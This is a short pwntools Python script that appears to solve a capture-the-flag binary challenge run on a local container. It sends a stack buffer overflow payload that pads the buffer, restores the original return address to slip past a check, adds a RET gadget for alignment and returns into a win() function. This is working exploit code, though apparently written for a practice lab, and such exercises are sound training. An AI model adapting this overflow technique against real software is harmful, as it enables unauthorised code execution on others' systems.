#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time
import binascii

context.update(arch='amd64')
exe = './outside'
HOST = '172.17.0.2'
PORT = 3141

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
c
'''.format(**locals())

p = start()
payload = b"A" * 88      # buffer pad
payload += p64(0x401222) # put original RETADDR in place to bypass check 
payload += b"B"*8        # EBP pad
payload += p64(0x40101a) # return to a RET; gadget for stack alignment issue
payload += p64(0x401196) # return to address of win() function
p.sendline(payload)
p.interactive()
